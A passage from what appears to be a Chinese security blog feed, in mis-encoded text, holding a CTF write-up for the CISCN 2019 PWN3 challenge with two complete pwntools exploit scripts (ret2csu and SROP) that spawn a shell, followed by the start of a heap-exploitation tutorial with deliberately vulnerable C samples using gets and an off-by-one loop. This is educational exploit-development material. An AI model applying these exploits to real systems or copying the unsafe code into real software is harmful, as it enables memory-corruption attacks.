href="https://www.nssctf.cn/problem/133">CISCN 2019åå—]PWN3 | NSSCTF</a></p><h5 id="åˆ†æé¢˜ç›®"><a href="#åˆ†æé¢˜ç›®" class="headerlink" title="åˆ†æé¢˜ç›®"></a>åˆ†æé¢˜ç›®</h5><h6 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h6><p><img src="/img/SROP/srop1_checksec.png"></p><p>è¿è¡Œèµ·æ¥åªæœ‰ä¸€ä¸ªè¾“å…¥å’Œè¾“å‡ºï¼Œæ²¡æœ‰ä»»ä½•æ–‡å­—æç¤º</p><p><img src="/img/SROP/srop1_checksec2.png"></p><h6 id="å‡½æ•°åˆ†æ"><a href="#å‡½æ•°åˆ†æ" class="headerlink" title="å‡½æ•°åˆ†æ"></a>å‡½æ•°åˆ†æ</h6><p>æ•´ä¸ªç¨‹åºå¾ˆå°å°±åªæœ‰ä¸€ä¸ªå‡½æ•° <code>vlun()</code>ï¼Œåˆ©ç”¨çš„æ˜¯ syscall ç³»ç»Ÿè°ƒç”¨æ¥è°ƒç”¨æ‰€ç”¨åˆ°çš„å‡½æ•°ã€‚</p><p><img src="/img/SROP/srop1_vuln.png"></p><p>read å¯ä»¥è¯»å– 400 å­—èŠ‚ï¼Œä½†æ˜¯ buf åªæœ‰ 10 å­—èŠ‚é•¿åº¦ï¼Œæ˜¯ä¸€ä¸ªå¯ä»¥ç”¨ç©ºé—´å¾ˆå¤§çš„æ ˆæº¢å‡ºé—®é¢˜ã€‚åŒæ ·è¾“å‡ºä¹Ÿæ˜¯å¤§äº buf å¤§å°çš„ï¼Œæ‰€ä»¥å¯ä»¥é€ æˆä¿¡æ¯æ³„éœ²ã€‚</p><p>æˆ‘ä»¬çœ‹æ±‡ç¼–ä»£ç éƒ¨åˆ†ï¼Œæœ‰ä¸€ä¸ªç°æˆçš„ <code>syscall;ret;</code> ä¾›æˆ‘ä»¬ä½¿ç”¨ã€‚</p><p><img src="/img/SROP/srop1_syscall.png"></p><h5 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h5><p>åœ¨ç¬¬ä¸€æ¬¡ readã€write æ—¶å‘æ ˆä¸Šå†™å…¥ â€˜&#x2F;bin&#x2F;sh\x00â€™ï¼Œå¹¶æ³„éœ²å‡ºå®ƒçš„åœ°å€ã€‚</p><p>æ³„éœ²åœ°å€åéœ€è¦è®¡ç®—ç›¸åº”çš„åç§»ï¼Œæˆ‘ä»¬æœ¬åœ°è°ƒè¯•ï¼Œåœ¨ç­‰å¾…è¾“å…¥çš„æ—¶å€™è¾“å…¥aaaaï¼Œæ¥ç€ç›´æ¥ <code>search aaaa</code> æŸ¥çœ‹å­—ç¬¦ä¸²å­˜å‚¨çš„ä½ç½®ã€‚</p><p><img src="/img/SROP/srop1_str.png"></p><p>æˆ‘ä»¬æœ€å¼€å§‹è¿›å…¥å‡½æ•°çš„æ—¶å€™çš„ rsi æŒ‡å‘æ ˆåŸºå€ï¼Œ</p><p><img src="/img/SROP/srop1_rip.png"></p><p>æ‰€ä»¥æˆ‘ä»¬çš„åç§»æ˜¯ offset &#x3D; 0xe0d8-0xdfc0&#x3D;0x118</p><p>æœ‰ä¸¤ç§æ”»å‡»æ–¹æ³•ï¼š</p><ul><li>execve ä¸ libc_csu_init</li></ul><p>ç”¨åˆ©ç”¨é¢˜ç›®ä¸­ <code>mov rax, 3Bh;ret</code> gatget æ¥ä¿®æ”¹ rax ä¸º 0x3bï¼ˆexecveï¼‰ï¼ŒåŒæ—¶åˆ©ç”¨ libc_csu_init æ¥ä¿®æ”¹ rdx ä¸º 0ï¼Œç”¨ <code>pop rdi;ret</code> æ¥ä¿®æ”¹ rdi çš„å€¼æŒ‡å‘ <code>/bin/sh</code> ã€‚</p><ul><li>srop</li></ul><p>åˆ©ç”¨ srop ï¼Œåœ¨æ ˆä¸­éƒ¨ç½²ä¸€ä¸ªä¼ªé€  signal Frame sigcontextï¼Œç„¶åç”¨ rt_sigreturn æ¥æ¶æ„æ¢å¤é‡è€Œ get shell ã€‚</p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>vuln_addr=<span class="hljs-number">0x04004F1</span><br>pay=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>))+p64(vuln_addr)<br><br>p.sendline(pay)<br>add=p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(u64(add)-<span class="hljs-number">0x118</span>))<br>stack=u64(add)-<span class="hljs-number">0x118</span><br>log.info(<span class="hljs-string">&#x27;stack:&#x27;</span>+<span class="hljs-built_in">hex</span>(stack))<br>rax=<span class="hljs-number">0x04004E2</span> <br>libc_csu_init_gat1=<span class="hljs-number">0x040059A</span><br>libc_csu_init_gat2=<span class="hljs-number">0x0400580</span><br>rdi_ret=<span class="hljs-number">0x04005a3</span><br>syscall_ret=<span class="hljs-number">0x0000000000400517</span><br><br>pay=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>))+p64(rax)+p64(libc_csu_init_gat1)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(stack+<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(libc_csu_init_gat2)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p64(rdi_ret)+p64(stack)+p64(syscall_ret)<br><br>p.sendline(pay)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>vuln_addr=<span class="hljs-number">0x04004F1</span><br>pay=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>))+p64(vuln_addr)<br><br>p.sendline(pay)<br>add=p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(u64(add)-<span class="hljs-number">0x118</span>))<br>stack=u64(add)-<span class="hljs-number">0x118</span><br>log.info(<span class="hljs-string">&#x27;stack:&#x27;</span>+<span class="hljs-built_in">hex</span>(stack))<br><br>syscall_ret=<span class="hljs-number">0x0400517</span>   <span class="hljs-comment"># syscall ; ret</span><br>rax=<span class="hljs-number">0x004004DA</span>  <span class="hljs-comment">#mov rax, 0Fh;ret</span><br>frame = SigreturnFrame()<br>frame.rax = <span class="hljs-number">59</span><br>frame.rdi = stack<br>frame.rsi = <span class="hljs-number">0</span><br>frame.rdx = <span class="hljs-number">0</span><br>frame.rip = syscall_ret<br>pay=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>))+p64(rax)+p64(syscall_ret)+<span class="hljs-built_in">str</span>(frame)<br>p.sendline(pay)<br>p.interactive()<br></code></pre></td></tr></table></figure><hr><p>äº‹æƒ…è¦ä»æˆ‘åœ¨nepCTFåšäº†ä¸€ä¸ªSROPä½†æ ¹æœ¬ä¸ä¼šåšå¼€å§‹è¯´èµ·Â·Â·Â·</p><p>ä¹‹å‰åšè¿‡è¿™ä¸ªä¾‹é¢˜ä½†æ˜¯å°±ä½¿ç”¨ ret2csu åšçš„ï¼Œç°åœ¨å‘ç° SROP æ›´ç®€å•</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>æ ˆ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å †æ¼æ´åˆ©ç”¨(ä¸€)</title>
    <link href="/2023/08/06/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/"/>
    <url>/2023/08/06/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<p>å †æ¼æ´çš„åˆ©ç”¨å§¿åŠ¿ï¼Œèµ¶ç´§æ¥å­¦ä¹ ä¸€ä¸‹å§ï¼ï¼</p><span id="more"></span><p><del>è¿™ä¸ªäººå‘ä»€ä¹ˆç–¯</del></p><blockquote><p>å¦‚æœæ²¡æœ‰ç‰¹æ®Šè¯´æ˜ï¼Œç¯å¢ƒä¸º ubuntu16  libc2.23  64ä½</p><p>è¿™ä¸ªç½‘å€å¯ä»¥æŸ¥çœ‹æºç  ï¼š<a href="https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c">malloc.c - malloc&#x2F;malloc.c - Glibc source code (glibc-2.23) - Bootlin</a></p></blockquote><h1 id="å †æº¢å‡º"><a href="#å †æº¢å‡º" class="headerlink" title="å †æº¢å‡º"></a>å †æº¢å‡º</h1><h3 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>å †æº¢å‡ºæ˜¯æŒ‡ç¨‹åºå‘æŸä¸ªå †å—å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†å †å—æœ¬èº«<strong>å¯ä»¥ä½¿ç”¨çš„å­—èŠ‚æ•°</strong>ï¼Œå› è€Œå¯¼è‡´äº†æ•°æ®æº¢å‡ºï¼Œå¹¶è¦†ç›–åˆ°äº†ç‰©ç†ç›¸é‚»çš„é«˜åœ°å€çš„ä¸‹ä¸€ä¸ªå †å—ã€‚</p><p>å †æº¢å‡ºçš„å‰ææ˜¯ï¼š</p><ul><li>ç¨‹åºå‘å †ä¸Šå†™å…¥æ•°æ®</li><li>å†™å…¥çš„æ•°æ®å¤§å°æ²¡æœ‰è¢«è‰¯å¥½çš„æ§åˆ¶</li></ul><p>å †æº¢å‡ºå’Œæ ˆæº¢å‡ºã€BSSæ®µæº¢å‡ºç›¸ä¼¼ï¼Œæ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºã€‚ä½†æ˜¯ä¸æ ˆæº¢å‡ºä¸åŒçš„æ˜¯ï¼Œå¯¹ä¸Šå¹¶æ²¡æœ‰è¿”å›åœ°å€è¿™æ ·çš„å¯ä»¥è®©æ”»å‡»è€…ç›´æ¥æ§åˆ¶æ‰§è¡Œæµç¨‹çš„æ•°æ®ï¼Œå› æ­¤åœ¨å †æº¢å‡ºçš„åˆ©ç”¨ä¸­ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡æ§åˆ¶EIPæ¥æ§åˆ¶ç¨‹åºã€‚</p><p>ä½†æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸å †ç›¸å…³çš„æ•°æ®ç»“æ„å“‡ï¼Œæˆ‘ä»¬çš„åˆ©ç”¨ç­–ç•¥å¦‚ä¸‹ï¼š</p><ul><li><p>è¦†ç›–ä¸å…¶<strong>ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ª chunk</strong> çš„å†…å®¹</p><ul><li><p>prev_size</p></li><li><p>sizeï¼Œä½ä¸‰ä½çš„æ¯”ç‰¹ä½æ•°æ®ï¼Œä»¥åŠå †å—çœŸæ­£çš„å¤§å°</p><ul><li><p>NON_MAIN_ARENA</p></li><li><p>IS_MAPPED</p></li><li><p>PREV_INUSE</p></li><li><p>the true chunk size</p></li></ul></li><li><p>chunk contentï¼Œæ”¹å˜ç¨‹åºçš„æ‰§è¡Œæµ</p></li></ul></li><li><p>åˆ©ç”¨å †çš„æœºåˆ¶å®ç°ä»»æ„åœ°å€å†™å…¥æˆ–è€…æ§åˆ¶å †å—ä¸­çš„å†…å®¹ï¼Œä»è€Œæ‰§è¡Œç¨‹åºçš„æ§åˆ¶æµã€‚</p></li></ul><h3 id="ä¸¾ä¸ªæ —å­ï¼š"><a href="#ä¸¾ä¸ªæ —å­ï¼š" class="headerlink" title="ä¸¾ä¸ªæ —å­ï¼š"></a>ä¸¾ä¸ªæ —å­ï¼š</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> <br>&#123;<br>  <span class="hljs-type">char</span> *chunk;<br>  chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get input:&quot;</span>);<br>  gets(chunk);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¾“å…¥A*100ï¼Œå°±å¯ä»¥æŠŠç›¸é‚»çš„å †è¦†ç›–æ‰</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/heapout_first.png"></p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/heapout_last.png"></p><h3 id="åˆ©ç”¨æ­¥éª¤"><a href="#åˆ©ç”¨æ­¥éª¤" class="headerlink" title="åˆ©ç”¨æ­¥éª¤"></a>åˆ©ç”¨æ­¥éª¤</h3><h5 id="å¯»æ‰¾åˆ†é…å‡½æ•°"><a href="#å¯»æ‰¾åˆ†é…å‡½æ•°" class="headerlink" title="å¯»æ‰¾åˆ†é…å‡½æ•°"></a>å¯»æ‰¾åˆ†é…å‡½æ•°</h5><p>é€šå¸¸æ¥è¯´ï¼Œå †é€šè¿‡ malloc å‡½æ•°åˆ†é…ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ä¹Ÿä¼šé€šè¿‡ calloc å‡½æ•°åˆ†é…ã€‚è¿™ä¸¤ä¸ªå‡½æ•°çš„åŒºåˆ«å°±æ˜¯ calloc åœ¨åˆ†é…åä¼šå°†ç©ºé—´å…¨éƒ¨åˆå§‹åŒ–ä¸º0ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-comment">//ç­‰åŒäº</span><br>ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-built_in">memset</span>(ptr,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>);<br></code></pre></td></tr></table></figure><p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ª realloc åˆ†é…æ–¹å¼ï¼Œç”¨äºå°†ç›®æ ‡å†…å­˜æ‰©å¤§ã€‚realloc å‡½æ•°å¯ä»¥èº«å…¼ malloc å’Œ free ä¸¤ä¸ªå‡½æ•°çš„åŠŸèƒ½ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">reaclloc(prt,size)        <span class="hljs-comment">//å°†ptrå†…å­˜å¤§å°å¢å¤§åˆ°sizeã€‚</span><br></code></pre></td></tr></table></figure><p>å…·ä½“æ“ä½œï¼š</p><ul><li><p>å¦‚æœ realloc çš„ size ä¸ç­‰äº prt çš„ size ï¼š</p><ul><li>ç”³è¯· size &gt; åŸæ¥çš„ size<ul><li>å¦‚æœ chunk ä¸ top chunk ç›¸é‚»ï¼Œç›´æ¥æ‹“å±•è¿™ä¸ª chunk åˆ°æ–°çš„ size å¤§å°</li><li>å¦‚æœ chunk ä¸ top chunk ä¸ç›¸é‚»ï¼Œç›¸å½“äº <code>free(ptr); malloc(new_size)</code></li></ul></li><li>ç”³è¯· size &lt; åŸæ¥çš„ size<ul><li>å¦‚æœç›¸å·®ä¸è¶³ä»¥å®¹çº³ä¸€ä¸ªæœ€å°çš„ chunkï¼Œï¼ˆ64 ä½ä¸‹ 32 ä¸ªå­—èŠ‚ï¼Œ32 ä½ä¸‹ 16 ä¸ªå­—èŠ‚ï¼‰ï¼Œåˆ™ä¿æŒä¸å˜</li><li>å¦‚æœç›¸å·®è¶³å¤Ÿå®¹çº³ä¸‹ä¸€ä¸ªæœ€å°çš„ chunkï¼Œå°±åˆ‡å‰²åŸæœ¬çš„ chunkï¼Œfree æ‰ååŠéƒ¨åˆ†</li></ul></li></ul></li><li><p>å¦‚æœ realloc çš„ size ç­‰äº 0ï¼Œç›¸å½“äº <code>free(prt)</code></p></li><li><p>å¦‚æœ realloc çš„ size ç­‰äº prt çš„ sizeï¼Œé‚£è®¡ç®—æœºå°†ä¸è¿›è¡Œä»»ä½•æ“ä½œ</p></li></ul><h5 id="å¯»æ‰¾å±é™©å‡½æ•°"><a href="#å¯»æ‰¾å±é™©å‡½æ•°" class="headerlink" title="å¯»æ‰¾å±é™©å‡½æ•°"></a>å¯»æ‰¾å±é™©å‡½æ•°</h5><p>å…¶å®å°±æ˜¯æ ˆæº¢å‡ºçš„æ—¶å€™æˆ‘ä»¬åˆ©ç”¨çš„é‚£ä¸€æ‰¹å±é™©å‡½æ•°ã€‚å¸¸è§çš„å±é™©å‡½æ•°å¦‚ä¸‹</p><ul><li>è¾“å…¥<ul><li>getsï¼Œç›´æ¥è¯»å–ä¸€è¡Œï¼Œå¿½ç•¥ <code>&#39;\x00&#39;</code></li><li>scanf</li><li>vscanf</li></ul></li><li>è¾“å‡º<ul><li>sprintf</li></ul></li><li>å­—ç¬¦ä¸²<ul><li>strcpyï¼Œå­—ç¬¦ä¸²å¤åˆ¶ï¼Œé‡åˆ° <code>&#39;\x00&#39;</code> åœæ­¢</li><li>strcatï¼Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œé‡åˆ° <code>&#39;\x00&#39;</code> åœæ­¢</li><li>bcopy</li></ul></li></ul><h5 id="ç¡®å®šå¡«å……é•¿åº¦"><a href="#ç¡®å®šå¡«å……é•¿åº¦" class="headerlink" title="ç¡®å®šå¡«å……é•¿åº¦"></a>ç¡®å®šå¡«å……é•¿åº¦</h5><p>è®¡ç®—æˆ‘ä»¬å¼€å§‹å†™å…¥çš„åœ°å€ä¸æˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€ä¹‹é—´çš„è·ç¦»ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œmallocå‚æ•°å¹¶ä¸ç­‰äºå®é™…å †å—åˆ†é…çš„å¤§å°ï¼Œæˆ‘ä»¬ä¹‹å‰æåˆ°ï¼Œåœ¨å®é™…çš„å†…å­˜åˆ†é…ä¸­éœ€è¦ä¿è¯chunk å¤§å°æ˜¯å¯¹é½çš„ï¼ˆå­—é•¿çš„ä¸¤å€ï¼‰ã€‚</p><p>å¹¶ä¸”ä¹Ÿå¹¶ä¸æ˜¯æœºå™¨åˆ†é…çš„chunkéƒ½æ˜¯ç”¨æˆ·å¯ä»¥ä½¿ç”¨çš„ç”¨æˆ·åŒºåŸŸï¼Œ<code>chunk_head.size = ç”¨æˆ·åŒºåŸŸå¤§å° + 2 * å­—é•¿</code></p><p>å°±æ¯”å¦‚æˆ‘ä»¬ä½¿ç”¨ <code>malloc(24)</code> ï¼Œåœ¨ 64 ä½çš„ç³»ç»Ÿä¸­ç”³è¯· 24 å­—èŠ‚çš„ chunk ã€‚ä½†ç”±äºéœ€è¦ä¿è¯å†…å­˜å¯¹é½ï¼Œç³»ç»Ÿä¼šå‘ä¸Šå–æ•´åˆ° 32 å­—èŠ‚ã€‚åœ¨åˆ†é…å‡ºæ¥çš„32å­—èŠ‚ä¸­ï¼Œåˆæœ‰ä¸¤ä¸ªæœºå™¨å­—é•¿ä¹Ÿå°±æ˜¯ 16 å­—èŠ‚çš„å¤´éƒ¨ä¸èƒ½ä¾›ç”¨æˆ·ä½¿ç”¨ï¼Œæ‰€ä»¥å®é™…ä¸Šæˆ‘ä»¬ç”³è¯· 24 å­—èŠ‚çš„å­—æ®µï¼Œå®é™…ä¸Šç”¨æˆ·å¯ä»¥ä½¿ç”¨çš„ chunk ä¸º 16 å­—èŠ‚ã€‚</p><p>ä½†æ˜¯è¿™ä¸ªå †å—ä»ç„¶å¯ä»¥å‚¨å­˜24å­—èŠ‚çš„æ•°æ®ï¼Œå› ä¸ºå®ƒå¯ä»¥ä½¿ç”¨ä¸‹ä¸€ä¸ª chunk çš„ pre_size å­—æ®µï¼Œæ­£å¥½ 24 ä¸ªå­—èŠ‚ï¼ˆ off-by-one æ¼æ´å°±æ˜¯è¿™ä¹ˆæ¥çš„ï¼‰ã€‚</p><h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><p>ä¸¥æ ¼æ¥è®² off-by-one ä¹Ÿæ˜¯ä¸€ç§æº¢å‡ºçš„æ“ä½œï¼Œä½†æ˜¯ off-by-one ç‰¹æŒ‡ç¨‹åºå‘ç¼“å†²åŒºä¸­å†™å…¥æ—¶ï¼Œå†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†è¿™ä¸ªç¼“å†²åŒºæœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°å¹¶ä¸”åª<strong>è¶Šç•Œäº†ä¸€ä¸ªå­—èŠ‚</strong>çš„æº¢å‡ºåˆ©ç”¨ã€‚</p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>off-by-one æ˜¯å•å­—èŠ‚æº¢å‡ºï¼Œè¿™ç§æ¼æ´çš„äº§ç”Ÿå¾€å¾€ä¸è¾¹ç•ŒéªŒè¯ä¸ä¸¥å’Œå­—ç¬¦ä¸²æ“ä½œæœ‰å…³ï¼Œå½“ç„¶ä¹Ÿä¸æ’é™¤å†™å…¥çš„ size æ­£å¥½å°±åªå¤šäº†ä¸€ä¸ªå­—èŠ‚çš„æƒ…å†µï¼ˆå°±åƒä¸Šä¸€ä¸ª malloc(24) çš„ä¾‹å­ï¼‰ã€‚</p><p>å…¶ä¸­è¾¹ç•ŒéªŒè¯ä¸ä¸¥è°¨ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§å¯èƒ½ï¼š</p><ul><li>ä½¿ç”¨å¾ªç¯è¯­å¥å‘å †ä¸­å†™å…¥æ•°æ®æ—¶ï¼Œå¾ªç¯æ¬¡æ•°è®¾ç½®é”™è¯¯</li><li>å­—ç¬¦ä¸²æ“ä½œä¸æ­£ç¡®</li></ul><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><h5 id="æº¢å‡ºå­—èŠ‚ä¸ºå¯æ§åˆ¶å­—èŠ‚"><a href="#æº¢å‡ºå­—èŠ‚ä¸ºå¯æ§åˆ¶å­—èŠ‚" class="headerlink" title="æº¢å‡ºå­—èŠ‚ä¸ºå¯æ§åˆ¶å­—èŠ‚"></a>æº¢å‡ºå­—èŠ‚ä¸ºå¯æ§åˆ¶å­—èŠ‚</h5><p>é€šè¿‡ä¿®æ”¹å†…å­˜å—çš„å¤§å°é€ æˆå—ç»“æ„ä¹‹é—´çš„é‡å ï¼Œä»è€Œæ³„éœ²å…¶ä»–å—æ•°æ®ï¼Œæˆ–æ˜¯è¦†ç›–ä¿®æ”¹å…¶ä»–å—æ•°æ®ã€‚</p><h5 id="æº¢å‡ºå­—èŠ‚ä¸ºNULLå­—èŠ‚"><a href="#æº¢å‡ºå­—èŠ‚ä¸ºNULLå­—èŠ‚" class="headerlink" title="æº¢å‡ºå­—èŠ‚ä¸ºNULLå­—èŠ‚"></a>æº¢å‡ºå­—èŠ‚ä¸ºNULLå­—èŠ‚</h5><p>åœ¨ size ä¸º 0x100 çš„æ—¶å€™ï¼Œæº¢å‡º NULL å­—èŠ‚å¯ä»¥ä½¿å¾— <code>prev_in_use</code> ä½è¢«æ¸…ï¼Œè¿™æ ·å‰å—ä¼šè¢«è®¤ä¸ºæ˜¯ free å—ã€‚</p><ul><li>ä½¿ç”¨ unlink è¿›è¡Œå¤„ç†</li><li>è¿™æ—¶ <code>prev_size</code> åŸŸå°±ä¼šå¯ç”¨ï¼Œå¯ä»¥ä¼ªé€  <code>prev_size</code> ï¼Œä»è€Œé€ æˆå—ä¹‹é—´å‘ç”Ÿé‡å ã€‚æ­¤æ–¹æ³•çš„å…³é”®åœ¨äº unlink çš„æ—¶å€™æ²¡æœ‰æ£€æŸ¥æŒ‰ç…§ <code>prev_size</code> æ‰¾åˆ°çš„å—çš„å¤§å°ä¸<code>prev_size</code> æ˜¯å¦ä¸€è‡´ã€‚</li></ul><blockquote><p>åœ¨glibc2.28åŠä»¥å‰çš„ç‰ˆæœ¬ä¸­éƒ½æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œæœ€æ–°ç‰ˆæœ¬ä¸­å·²ç»æ·»åŠ äº†å¯¹åº”çš„æ£€æŸ¥æ–¹æ³•ã€‚</p></blockquote><h4 id="ğŸŒ°ï¼š"><a href="#ğŸŒ°ï¼š" class="headerlink" title="ğŸŒ°ï¼š"></a>ğŸŒ°ï¼š</h4><p>æ —å­1ï¼š</p><p>å¯¼è‡´ off-by-one æ¼æ´çš„ä¸€ä¸ªåŸå› å°±æ˜¯è¾“å…¥çš„è¾¹ç•Œæ£€æŸ¥ä¸æ¸…ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªæ …æ é”™è¯¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">my_gets</span><span class="hljs-params">(<span class="hljs-type">char</span> *ptr,<span class="hljs-type">int</span> size)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=size;i++)<br>    &#123;<br>        ptr[i]=getchar();<br>    &#125;<br>    <span class="hljs-keyword">return</span> i;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get Input:&quot;</span>);<br>    my_gets(chunk1,<span class="hljs-number">16</span>);<br>    <span class="hljs-keyword">return</span> <span 